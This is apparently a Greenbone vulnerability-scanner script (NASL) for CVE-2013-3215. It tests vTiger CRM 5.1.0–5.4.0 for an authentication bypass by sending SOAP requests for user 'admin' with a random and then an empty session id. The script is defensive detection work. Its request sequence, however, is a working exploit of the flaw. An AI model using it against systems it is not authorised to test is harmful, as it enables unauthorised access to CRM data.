CPE = "cpe:/a:vtiger:vtiger_crm";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103972" );
	script_bugtraq_id( 61559 );
	script_cve_id( "CVE-2013-3215" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_name( "vTiger CRM Authentication Bypass Vulnerability" );
	script_xref( name: "URL", value: "https://www.vtiger.com/blogs/?p=1467" );
	script_xref( name: "URL", value: "http://karmainsecurity.com/KIS-2013-08" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2014-01-28 15:47:55 +0700 (Tue, 28 Jan 2014)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_vtiger_crm_detect.sc" );
	script_mandatory_keys( "vtiger/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "vTiger CRM Authentication Bypass Vulnerability" );
	script_tag( name: "vuldetect", value: "Tries to exploit the vulnerability by calling the respective SOAP call." );
	script_tag( name: "solution", value: "Apply the patch from the link below or upgrade to version 6.0 or later." );
	script_tag( name: "insight", value: "The installed vTiger CRM is prone to an authentication bypass
  vulnerability. The vulnerable code is located in the validateSession() function,
  which is defined in multiple SOAP services." );
	script_tag( name: "affected", value: "vTiger CRM version 5.1.0 to 5.4.0." );
	script_tag( name: "impact", value: "A remote attacker can bypass the authentication mechanism." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("version_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: FALSE )){
	exit( 0 );
}
vtVer = infos["version"];
if(version_is_greater( version: vtVer, test_version: "5.4.0" )){
	exit( 99 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
func checkemail_soap_req( user, sessionid ){
	soapreq = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" + "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\r\n" + "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\r\n" + "xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\r\n" + "xmlns:crm=\"http://www.vtiger.com/products/crm\">\r\n" + "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\r\n" + "<soapenv:Header/>\r\n" + "<soapenv:Body>\r\n" + "  <crm:CheckEmailPermission\r\n" + "     soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n" + "    <username\r\n" + "      xsi:type=\"xsd:string\">" + user + "</username>\r\n" + "    <session\r\n" + "      xsi:type=\"xsd:string\">" + sessionid + "</session>\r\n" + "  </crm:CheckEmailPermission>\r\n" + "</soapenv:Body>\r\n" + "</soapenv:Envelope>";
	return soapreq;
}
func send_soap_req( data ){
	dir = infos["location"];
	if(!dir){
		exit( 0 );
	}
	if(dir == "/"){
		dir = "";
	}
	len = strlen( data );
	url = dir + "/soap/vtigerolservice.php";
	request = NASLString( "POST ", url, " HTTP/1.1\r\n", "Host: ", host, "\r\n", "User-Agent: ", useragent, "\r\n", "Content-Type: text/xml; charset=UTF-8\r\n", "Content-Length: ", len, "\r\n", "\r\n", data );
	res = http_keepalive_send_recv( port: port, data: request, bodyonly: TRUE );
	return res;
}
randint = rand() % 4;
sessionid = rand_str( length: 4 + randint, charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" );
request = checkemail_soap_req( user: "admin", sessionid: sessionid );
response = send_soap_req( data: request );
if(!response || !ereg( string: response, pattern: "<return xsi:nil=\"true\" xsi:type=\"xsd:string\"/>", icase: FALSE )){
	exit( 0 );
}
request2 = checkemail_soap_req( user: "admin", sessionid: "" );
response2 = send_soap_req( data: request2 );
if(response2 && egrep( string: response2, pattern: "<return xsi:type=\"xsd:string\">.*</return>", icase: FALSE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

